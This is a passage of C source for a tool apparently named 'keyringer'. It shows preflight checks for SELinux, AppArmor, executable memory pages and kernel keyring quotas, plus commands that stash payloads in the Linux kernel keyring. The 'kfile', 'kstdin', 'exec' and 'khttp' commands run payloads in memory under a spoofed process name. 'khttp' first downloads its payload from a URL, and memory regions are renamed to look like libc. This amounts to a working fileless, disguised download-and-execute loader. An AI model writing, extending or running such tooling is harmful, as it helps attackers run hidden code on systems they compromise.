        if (small_file("/sys/fs/selinux/enforce", buf, sizeof buf) == 0)
            enforce = (int)strtol(buf, NULL, 10);
        small_file("/proc/self/attr/current", ctx, sizeof ctx);
        if (enforce < 0 && !ctx[0])
            pf("selinux", 0, "INFO", "not present");
        else
            pf("selinux", 0, "INFO", "present (enforce=%d, current=\"%s\")",
               enforce, ctx);
    }

    /* (c) AppArmor */
    {
        char ctx[256] = { 0 };

        small_file("/proc/self/attr/current", ctx, sizeof ctx);
        pf("apparmor", 0, "INFO", "current=\"%s\"%s",
           ctx[0] ? ctx : "<unset>",
           ctx[0] && !strstr(ctx, "unconfined") ?
           " (confined profile active)" : "");
    }

    /* (d) W^X — CRITICAL */
    if (wx_test() == 0) {
        pf("wx", 1, "PASS",
           "anon RW page -> write 0xC3 -> mprotect PROT_EXEC -> call: allowed");
    } else {
        critical_fail = 1;
        pf("wx", 1, "FAIL", "exec of staged RW page: denied");
    }

    /* (e) keyring quotas (limits) + live per-UID measurement */
    {
        char mk[64] = { 0 }, mb[64] = { 0 };

        small_file("/proc/sys/kernel/keys/maxkeys", mk, sizeof mk);
        small_file("/proc/sys/kernel/keys/maxbytes", mb, sizeof mb);
        pf("keyring", 0, "INFO",
           "maxkeys=%s maxbytes=%s (per-UID; non-root is bound by maxbytes "
           "in total, root's cap is higher, 25 MiB by default)", mk, mb);
    }
    {
        kr_quota q;
        char qerr[KR_ERRSZ];

        if (kr_quota_snapshot(&q, qerr) == 0)
            pf("keyring-quota", 0, "INFO",
               "used/max keys=%lu/%lu, used/max bytes=%lu/%lu, "
               "remaining=~%lu bytes (live /proc/key-users measurement%s)",
               q.keys_used, q.keys_max, q.bytes_used, q.bytes_max,
               q.bytes_remaining,
               q.measured ? "" :
               "; no row for this uid yet — nothing used");
        else
            pf("keyring-quota", 0, "INFO", "%s", qerr);
    }

    /* (f) libcurl dlopen availability */
    {
#ifdef KR_NO_DLOPEN
        pf("libcurl", 0, "INFO",
           "dynamic loading not supported in this static build "
           "(khttp unavailable; use keyringer-dyn)");
#else
        void *h = dlopen ? dlopen("libcurl.so.4", RTLD_NOW) : NULL;

        if (h) {
            if (dlclose)
                dlclose(h);
            pf("libcurl", 0, "PASS", "dlopen libcurl.so.4 ok");
        } else {
            const char *e = dlerror ? dlerror() : NULL;

            pf("libcurl", 0, "INFO",
               "dlopen libcurl.so.4 failed (%s) (static build or no libcurl; "
               "khttp unavailable)", e ? e : "dynamic loading not supported");
        }
#endif
    }

    /* (g) PR_SET_VMA support (probe shared with kr_selftest part 8) */
    if (kr_vma_probe())
        pf("vma", 0, "PASS", "PR_SET_VMA naming works ([anon:libc:*] "
           "visible in /proc/self/maps)");
    else
        pf("vma", 0, "INFO", "PR_SET_VMA naming rejected (see stderr "
           "errno; feature stays nonfatal)");

    /* (h) clone(CLONE_VM) smoke */
    {
        char err[KR_ERRSZ];

        if (kr_clone_smoke(err) == 0)
            pf("clone", 0, "PASS", "CLONE_VM|SIGCHLD child ran and _exit(0)ed");
        else
            pf("clone", 0, "FAIL", "%s", err);
    }

    /* (i) AF_ALG sha256 + rfc7539 AEAD */
    {
        char err[KR_ERRSZ];

        if (kr_alg_probe(err) == 0)
            pf("afalg", 0, "PASS", "bind \"hash\"/\"sha256\" and "
               "\"aead\"/\"rfc7539(chacha20,poly1305)\"");
        else
            pf("afalg", 0, "FAIL", "%s", err);
    }

    if (json)
        printf("]\n");
    return critical_fail ? 1 : 0;
}

/* ===================================================================== */
/* commands                                                               */
/* ===================================================================== */

int main(int argc, char **argv)
{
    kr_set_log(kr_log_stderr);
    kr_set_process_argv(argc, argv);
    setvbuf(stdout, NULL, _IOLBF, 0);

    if (argc < 2) {
        usage(stderr);
        return 1;
    }
    const char *cmd = argv[1];

    if (strcmp(cmd, "help") == 0 || strcmp(cmd, "-h") == 0 ||
        strcmp(cmd, "--help") == 0) {
        usage(stdout);
        return 0;
    }

    if (strcmp(cmd, "selftest") == 0) {
        char err[KR_ERRSZ];

        if (kr_selftest(err) != 0)
            die("%s", err);
        printf("selftest: ok (%s)\n", kr_version());
        return 0;
    }

    if (strcmp(cmd, "keygen") == 0) {
        char hex[KR_KEY_HEX_LEN + 1];
        char err[KR_ERRSZ];

        if (kr_keygen(hex, err) != 0)
            die("%s", err);
        printf("%s\n", hex);
        return 0;
    }

    if (strcmp(cmd, "list") == 0) {
        struct cli c;

        cli_parse(argc, argv, 2, &c);
        free(c.args);
        free(c.headers);
        return cmd_list(c.desc ? c.desc : KR_DEFAULT_DESC, c.json);
    }

    if (strcmp(cmd, "preflight") == 0) {
        struct cli c;

        cli_parse(argc, argv, 2, &c);
        free(c.args);
        free(c.headers);
        return cmd_preflight(c.json);
    }

    if (strcmp(cmd, "gc") == 0) {
        struct cli c;
        char err[KR_ERRSZ];

        cli_parse(argc, argv, 2, &c);
        free(c.args);
        free(c.headers);
        if (kr_gc(c.desc ? c.desc : KR_DEFAULT_DESC, err) != 0)
            die("%s", err);
        return 0;
    }

    if (strcmp(cmd, "keepalive") == 0) {
        const char *desc = NULL;
        long interval = 3600, times = 0;
        int unit = 0;

        /* keepalive's flags are parsed by hand (cli_parse would reject
         * --interval/--times/--unit as unknown) */
        for (int i = 2; i < argc; i++) {
            const char *a = argv[i];

            if (strcmp(a, "--desc") == 0) {
                if (++i >= argc)
                    die("--desc requires a value");
                desc = argv[i];
            } else if (strcmp(a, "--interval") == 0) {
                if (++i >= argc)
                    die("--interval requires a value");
                interval = strtol(a = argv[i], NULL, 10);
                if (interval <= 0)
                    die("--interval must be a positive number of seconds");
            } else if (strcmp(a, "--times") == 0) {
                if (++i >= argc)
                    die("--times requires a value");
                times = strtol(argv[i], NULL, 10);
                if (times <= 0)
                    die("--times must be a positive beat count");
            } else if (strcmp(a, "--unit") == 0) {
                unit = 1;
            } else if (a[0] == '-' && a[1] != '\0') {
                fprintf(stderr, "keyringer: unknown keepalive flag '%s'\n", a);
                usage(stderr);
                return 1;
            } else {
                usage(stderr);
                return 1;
            }
        }
        if (!desc) {
            const char *e = getenv("KEYRINGER_DESC");

            desc = e && *e ? e : KR_DEFAULT_DESC;
        }
        kr_opts o;

        memset(&o, 0, sizeof o);
        o.desc_prefix = desc;
        return cmd_keepalive_opts(&o, interval, times, unit);
    }

    if (strcmp(cmd, "agent") == 0) {
        struct cli c;

        cli_parse(argc, argv, 2, &c);
        if (c.npos || c.call) {
            usage(stderr);
            return 1;
        }
        int rc = cmd_agent(&c);

        free(c.args);
        free(c.headers);
        return rc;
    }

    if (strcmp(cmd, "stash") == 0) {
        struct cli c;

        cli_parse(argc, argv, 2, &c);
        if (c.npos < 1 || c.raw || c.call || c.clone) {
            usage(stderr);
            return 1;
        }
        kr_opts o;

        build_opts(&c, &o);
        const char *prefix = c.desc ? c.desc : KR_DEFAULT_DESC;
        uint8_t *d;
        size_t n;

        if (strcmp(c.pos[0], "-") == 0)
            d = read_stream(stdin, &n);
        else
            d = read_file(c.pos[0], &n);
        fprintf(stderr, "stash: prefix \"%s\", %s keyring, %s keys\n",
                prefix, c.persistent ? "persistent" : "session",
                c.key_type ? c.key_type : "user");
        stash_and_share(&c, &o, d, n);
        if (c.key)
            fprintf(stderr, "stash: NOTE: encrypted stash — exec needs the "
                    "same key (--key HEX / --keyfd N / $KEYRINGER_KEY)\n");
        free(c.args);
        free(c.headers);
        return 0;
    }

    if (strcmp(cmd, "kfile") == 0) {
        struct cli c;

        cli_parse(argc, argv, 2, &c);
        if (c.npos < 1) {
            usage(stderr);
            return 1;
        }
        const char *spoof = c.npos >= 2 ? c.pos[1] : DEFAULT_SPOOF;
        size_t n;
        uint8_t *d = read_file(c.pos[0], &n);

        join_fresh_ring(&c);
        int rc = run_payload(&c, spoof, d, n);

        free(c.args);
        free(c.headers);
        return rc;
    }

    if (strcmp(cmd, "kstdin") == 0) {
        struct cli c;

        cli_parse(argc, argv, 2, &c);
        const char *spoof = c.npos >= 1 ? c.pos[0] : DEFAULT_SPOOF;

        join_fresh_ring(&c);

        /* for kstdin the positionals are [name, args...] — pos[1] is an arg */
        if (c.npos >= 2) {
            memmove(c.args + 1, c.args, (size_t)c.nargs * sizeof(char *));
            c.args[0] = (char *)c.pos[1];
            c.nargs++;
        }
        size_t n;
        uint8_t *d = read_stream(stdin, &n);

        int rc = run_payload(&c, spoof, d, n);

        free(c.args);
        free(c.headers);
        return rc;
    }

    if (strcmp(cmd, "khttp") == 0) {
        struct cli c;
        char err[KR_ERRSZ];

        cli_parse(argc, argv, 2, &c);
        if (c.npos < 1) {
            usage(stderr);
            return 1;
        }
        const char *spoof = c.npos >= 2 ? c.pos[1] : DEFAULT_SPOOF;
        void *d;
        size_t n;

        if (kr_http_get_ex(c.pos[0], c.proxy,
                           (const char *const *)c.headers, c.insecure,
                           &d, &n, err) != 0)
            die("%s", err);
        fprintf(stderr, "khttp: fetched %zu bytes from %s\n", n, c.pos[0]);
        int rc = run_payload(&c, spoof, d, n);

        free(c.args);
        free(c.headers);
        return rc;
    }

    if (strcmp(cmd, "exec") == 0) {
        struct cli c;

        cli_parse(argc, argv, 2, &c);
        const char *spoof = c.npos >= 1 ? c.pos[0] : DEFAULT_SPOOF;

        /* exec deliberately stays on the inherited ring: deferred stashes
         * from other processes live there */

        /* for exec the positionals are [name, args...] — pos[1] is an arg */
        if (c.npos >= 2) {
            memmove(c.args + 1, c.args, (size_t)c.nargs * sizeof(char *));
            c.args[0] = (char *)c.pos[1];
            c.nargs++;
        }
        int rc = run_payload(&c, spoof, NULL, 0);

        free(c.args);
        free(c.headers);
        return rc;
    }

    fprintf(stderr, "keyringer: unknown command '%s'\n", cmd);
    usage(stderr);
    return 1;
}
